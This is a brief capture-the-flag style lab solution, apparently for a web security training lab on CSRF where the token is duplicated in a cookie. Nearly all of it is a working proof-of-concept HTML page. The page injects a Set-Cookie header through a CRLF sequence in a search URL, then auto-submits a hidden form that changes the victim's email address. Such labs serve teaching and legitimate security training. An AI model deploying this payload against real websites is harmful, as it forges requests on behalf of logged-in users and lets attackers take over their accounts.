# Lab: CSRF where token is duplicated in cookie

This is the same as lab 5, but we are actually setting the csrf token via the search SetCookie header and sending the request to change the email address using the token we set.

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://acfe1f0f1ee03000c068f52100dc0054.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asdf&#64;asdf&#46;com" />
      <input type="hidden" name="csrf" value="supersecure" />
    </form>
    <img src="https://acfe1f0f1ee03000c068f52100dc0054.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=supersecure" onerror="document.forms[0].submit()">
  </body>
</html>
```